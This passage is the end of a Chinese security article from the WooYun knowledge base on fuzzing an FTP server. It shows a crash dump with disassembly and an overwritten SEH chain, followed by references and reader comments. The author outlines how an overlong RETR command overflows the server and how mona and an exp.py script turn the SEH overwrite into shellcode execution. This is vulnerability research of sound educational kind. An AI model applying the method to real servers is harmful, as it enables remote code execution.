+  +14: 00000000 (         0) -&gt; N/A
+
+disasm around:
+        0x77c1211b jz 0x77c12136
+        0x77c1211d mov dl,[ecx]
+        0x77c1211f inc ecx
+        0x77c12120 test dl,dl
+        0x77c12122 jz 0x77c12188
+        0x77c12124 mov [edi],dl
+        0x77c12126 inc edi
+        0x77c12127 test ecx,0x3
+        0x77c1212d jnz 0x77c1211d
+        0x77c1212f jmp 0x77c12136
+        0x77c12131 mov [edi],edx
+        0x77c12133 add edi,0x4
+        0x77c12136 mov edx,0x7efefeff
+        0x77c1213b mov eax,[ecx]
+        0x77c1213d add edx,eax
+        0x77c1213f xor eax,0xffffffff
+        0x77c12142 xor eax,edx
+        0x77c12144 mov edx,[ecx]
+        0x77c12146 add ecx,0x4
+        0x77c12149 test eax,0x81010100
+        0x77c1214e jz 0x77c12131
+
+SEH unwind:
+        6d6d6d6d -&gt; [INVALID]:6d6d6d6d Unable to disassemble at 6d6d6d6d
+        ffffffff -&gt; [INVALID]:ffffffff Unable to disassemble at ffffffff
+
+
+ftp didn't response
+ftp didn't response
+ftp didn't response
+</code></pre><p>可以看到fuzz出RETR命令发送长数据包可导致溢出,前面的文章介绍过,配合mona找到刚好覆盖到seh chain的位置,改一下exp.py就可以执行shellcode了.</p><p>文章到此结束,纰漏之处 欢迎诸君批评、斧正.</p><p><strong>特别感谢bstaint表哥和赵中老师的帮助.</strong></p><h1>0x02 参考文档</h1><hr><ul><li>《模糊测试-强制发觉安全漏洞的利器》</li><li>《python灰帽子》</li><li><a href="http://pedramamini.com/PaiMei/heap_trace/hook_container.py">http://pedramamini.com/PaiMei/heap&#95;trace/hook&#95;container.py</a></li><li><a href="http://bbs.pediy.com/showthread.php?t=151870">http://bbs.pediy.com/showthread.php?t=151870</a></li></ul><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">pr0mise</span> <span class="reply-time">2016-05-21 16:08:59</span></div><p></p><p>@Huacon 啊 那个群我加了...</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Huacon</span> <span class="reply-time">2016-05-20 17:16:53</span></div><p></p><p>光牛啊，在二进制那个群？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Huacon</span> <span class="reply-time">2016-05-20 17:15:47</span></div><p></p><p>我之前看过模糊测试，文章写的不错</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">pr0mise</span> <span class="reply-time">2016-05-13 18:00:48</span></div><p></p><p>有没有技术氛围比较好的群推荐一下</p><p></p></div></div></div></div></div></main>
